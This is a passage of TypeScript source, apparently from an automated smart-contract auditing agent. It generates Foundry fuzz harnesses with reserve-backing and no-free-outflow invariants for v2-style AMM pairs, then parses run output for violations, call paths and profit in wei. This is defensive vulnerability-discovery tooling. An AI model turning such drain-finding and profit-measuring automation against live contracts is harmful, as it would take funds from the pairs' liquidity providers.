        vm.deal(address(this), 10e18);

        // Scope the fuzzer: the harness + the pair's own entrypoints only.
        targetContract(address(this));
        targetContract(address(target));
    }

    receive() external payable {}

    /// Attribute the harness's balance change since the last _account() call:
    /// decreases are donations, increases are inflows from the pair.
    function _account() internal {
        uint256 b0 = IERC20Minimal(token0).balanceOf(address(this));
        uint256 b1 = IERC20Minimal(token1).balanceOf(address(this));
        if (seed0 - donated0 + swept0 > b0) donated0 += (seed0 - donated0 + swept0) - b0;
        else swept0 += b0 - (seed0 - donated0 + swept0);
        if (seed1 - donated1 + swept1 > b1) donated1 += (seed1 - donated1 + swept1) - b1;
        else swept1 += b1 - (seed1 - donated1 + swept1);
    }

    // ---------- PRIMITIVES ----------
${primBlock.join("\n\n")}

    // ---------- UNIVERSAL INVARIANTS ----------

    /// Booked reserves must never exceed the pair's REAL token holdings.
    /// Phantom reserves = accounting the pair cannot back (sync/fee confusion).
    function invariant_GEN_amm_reserves_backed() public {
        (uint112 r0, uint112 r1, ) = target.getReserves();
        assertGe(IERC20Minimal(token0).balanceOf(address(target)), uint256(r0),
            "GENINV-amm-reserves0: booked reserves exceed real token0 holdings (phantom reserves)");
        assertGe(IERC20Minimal(token1).balanceOf(address(target)), uint256(r1),
            "GENINV-amm-reserves1: booked reserves exceed real token1 holdings (phantom reserves)");
    }

    /// The harness's holdings are exactly explained by its own recorded flows:
    /// seed - donated + swept. Anything more means the pair PAID the harness
    /// tokens it never gave — a skim-overflow / underpriced-swap drain.
    function invariant_GEN_amm_no_free_outflow() public {
        assertLe(IERC20Minimal(token0).balanceOf(address(this)), seed0 - donated0 + swept0,
            "GENINV-amm-outflow0: unexplained token0 gain (pair paid out more than it received)");
        assertLe(IERC20Minimal(token1).balanceOf(address(this)), seed1 - donated1 + swept1,
            "GENINV-amm-outflow1: unexplained token1 gain (pair paid out more than it received)");
    }
}
`;
  const open = (src.match(/{/g) ?? []).length;
  const close = (src.match(/}/g) ?? []).length;
  if (open !== close) return null;

  mkdirSync(AGENT_TEST_DIR, { recursive: true });
  const filePath = join(AGENT_TEST_DIR, `${contractName}.t.sol`);
  writeFileSync(filePath, sanitizeSoliditySource(src));
  return { contractName, filePath, shape: "amm-v2", skippedFns: [] };
}

// ------------------------------------------------------------ evaluation

/** Classify a harness run: compile error vs setUp failure vs held vs violation. */
export function evaluateGenHarness(output: string): GenEvaluation {
  const compileError = /Compiler run failed|Error \(\d+\)/.test(output);
  const setupFailed = !compileError && /FAIL[^\n]*setUp\(\)/.test(output);
  const invMatch = output.match(/GENINV-([a-z0-9-]+)/i);
  const path = [...output.matchAll(/\[GEN_PATH\]\s+(\S+)/g)]
    .map((m) => m[1]!)
    .slice(-10)
    .join(" -> ");
  const profit = output.match(/\[PROFIT_WEI\]\s+(\d+)/);
  return {
    discovered: !compileError && !setupFailed && !!invMatch,
    invariant: invMatch?.[1] ?? "",
    compileError,
    compileErrorDetail: compileError ? compileErrorExcerpt(output) : undefined,
    setupFailed,
    setupFailedDetail: setupFailed ? setupErrorExcerpt(output) : undefined,
    path,
    profitWei: profit?.[1] ?? null,
  };
}

/** The compiler's own words, so a generator bug is diagnosable from the log
 * instead of the log only saying "failed to compile (agent bug)". */
export function compileErrorExcerpt(output: string): string | undefined {
  const m = output.match(/Error\s*\(\d+\):[^\n]*\n(?:[^\n]*\n){0,3}/);
  if (m) return m[0].trim().slice(0, 500);
  const alt = output.match(/(Compiler run failed[^\n]*)/);
  return alt ? alt[1].trim().slice(0, 500) : undefined;
}

/** Why setUp() failed — usually a constructor/state shape the generator could
 * not bootstrap, which is a generator bug too (or an honest dead end to record
 * once instead of re-deriving every cycle). */
export function setupErrorExcerpt(output: string): string | undefined {
  const m = output.match(/\[FAIL[^\]]*setUp\(\)[^\]]*\]/);
  return m ? m[0].slice(0, 300) : undefined;
}

/** Move a run harness into reports/gen/ as discovery evidence. */
export function archiveGenHarness(filePath: string, contractName: string): string {
  try {
    const dir = join(REPORT_DIR, "gen");
    mkdirSync(dir, { recursive: true });
    const dest = join(dir, `${contractName}.t.sol`);
    renameSync(filePath, dest);
    return dest;
  } catch {
    return filePath;
  }
}
